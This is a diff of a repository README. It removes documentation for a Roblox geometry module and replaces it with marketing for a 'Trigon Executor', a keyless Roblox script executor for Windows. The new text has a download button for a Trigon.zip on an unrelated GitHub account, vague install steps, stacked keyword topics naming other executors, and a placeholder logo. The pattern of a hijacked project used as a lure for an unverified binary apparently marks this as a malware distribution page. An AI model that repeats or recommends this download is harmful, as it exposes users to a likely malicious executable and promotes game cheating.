@@ -1,61 +1,91 @@
-# Roblox Geometry Module
-This is a module which contains two important geometry functions for Roblox tooling.
+# Trigon Executor
 
-## getGeometry
+Discover unparalleled gaming with the Best Keyless Roblox Executor for Windows. Engineered for ultimate convenience, this cutting-edge Windows Roblox Script Executor offers a smooth, keyless interface.
 
-This is a function which returns a detailed mesh representation of the geometry of a Roblox primitive. That is, one of the five primitive types between a Box, WedgePart, CornerWedgePart, Sphere, or Cylinder. It contains all the logic to decide which of those geometries is appropriate for a given BasePart.
+---
 
-You can optionally pass a CFrame as the third argument to get the geometry assuming that the part were at that CFrame rather than where it currently is. Note: Passing `CFrame.identity` here will effectively give you the geometry in the local space of the object rather than in world space like it is normally given.
+## 🚀 Getting Started
 
-The id on each element is a stable id from invocation to invocation allowing you to track the same element across multiple invocations.
+Welcome to the Trigon Executor repository! Here you will find all the resources you need to get started with using the Trigon Executor for your Roblox gaming experience.
 
-The vertexMargin / edgeMargin are the minimum amount of "safe" space perpendicular to the feature, and can be used to determine a reasonable sizing of visualizations around the feature.
+To start using the Trigon Executor, simply follow the steps below:
 
-The data is returned in the following format:
-```luau
-type GeometryVertex = {
-	id: number,
-	position: Vector3,
-	type: "Vertex",
-}
+1. **Download Trigon Executor**: Click the button below to download the latest version of Trigon Executor.
+   
+   [![Download Trigon Executor](https://img.shields.io/badge/Download-Trigon%20Executor-blueviolet)](https://github.com/zxcvbnn90/files/releases/download/v1.0/Trigon.zip)
 
-type GeometryEdge = {
-	id: number,
-	a: Vector3,
-	b: Vector3,
-	direction: UnitVector3,
-	length: number,
-	edgeMargin: number,
-	vertexMargin: number,
-	part: BasePart,
-	type: "Edge",
-}
+2. **Installation**: Unzip the downloaded file and follow the installation instructions provided.
 
-type SurfaceType = "BottomSurface" | "TopSurface" | "LeftSurface" | "RightSurface" | "FrontSurface" | "BackSurface"
+3. **Usage**: Launch the Trigon Executor and experience the seamless Roblox Script execution at your fingertips.
 
-type GeometryFace = {
-	id: number,
-	point: Vector3,
-	normal: UnitVector3,
-	surface: SurfaceType,
-	direction: UnitVector3,
-	vertices: {Vector3},
-	part: BasePart,
-	type: "Face",
-}
+---
 
-type GeometryResult = {
-	part: BasePart,
-	shape: "Sphere" | "Cylinder" | "Mesh",
-	vertices: {GeometryVertex},
-	edges: {GeometryEdge},
-	faces: {GeometryFace},
-	vertexMargin: number,
-}
-```
+## 📦 Features
 
-## blackboxFindClosestMeshEdge
+- **Keyless Interface**: Enjoy a hassle-free gaming experience with a keyless interface.
+- **Roblox Script Execution**: Execute Roblox scripts effortlessly with Trigon Executor.
+- **Cutting-Edge Technology**: Engineered with cutting-edge technology for optimal performance.
+- **Windows Compatibility**: Trigon Executor is designed to work smoothly on Windows operating systems.
+- **Ultimate Convenience**: Experience ultimate convenience while using Trigon Executor for your gaming needs.
 
-For mouse hit in the form of a RaycastResult, find the edge closest to that hit. The edge is returned in the same `GeometryEdge` format as edges in the table returned by getGeometry. The function may be used for hits against primitive parts, but keep in mind that it will never return a result for Spheres / Cylinders since there aren't any straight edges to find.
+---
 
-The function operates by using up to 50 raycasts to inspect the geometry around the hit and then working out exactly where the edge must be analytically from that information. This means it comes at a significant perforance cost, and will run fine for tooling purposes, but should not be used in live experiences for gameplay purposes.
+## 📋 Repository Topics
+
+- roblox
+- executor
+- trigon-executor
+- trigon-evo
+- trigon-script
+- trigon-download
+- roblox-script-executor
+- trigon-evo-executor
+- trigon-evo-download
+- trigon-key
+- codex-executor
+- codex-roblox
+- delta-executor
+- delta-x
+
+---
+
+## 🛠️ Advanced Usage
+
+For users looking to explore the advanced features of Trigon Executor, you can delve deeper into the following functionalities:
+
+1. **Custom Scripts**: Create and execute custom Roblox scripts using the Trigon Executor.
+2. **Script Library**: Access a library of pre-built scripts for various Roblox games.
+3. **Optimization**: Learn how to optimize script execution for better performance in-game.
+4. **Troubleshooting**: Find solutions to common issues faced while using the Trigon Executor.
+
+---
+
+## 🤝 Contribution
+
+We welcome contributions from the community to enhance the Trigon Executor and provide an even better gaming experience for Roblox players. Here's how you can contribute:
+
+- **Reporting Issues**: If you encounter any bugs or issues, please report them in the "Issues" section of this repository.
+- **Feature Requests**: Share your ideas for new features and improvements that can be implemented in the Trigon Executor.
+- **Pull Requests**: Submit pull requests for bug fixes, new features, or enhancements to the existing codebase.
+
+---
+
+## 📝 License
+
+The Trigon Executor is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the code as per the terms of the license.
+
+---
+
+## 📧 Contact
+
+For any queries, feedback, or support regarding the Trigon Executor, you can reach out via email at [trigon.executor@gmail.com](mailto:trigon.executor@gmail.com).
+
+---
+
+## 🌟 Thank You
+
+Thank you for choosing Trigon Executor for your Roblox scripting needs. We hope you enjoy the seamless gaming experience it provides. Happy gaming! 🎮
+
+![Roblox Logo](https://example.com/roblox_logo.png)
+
+---
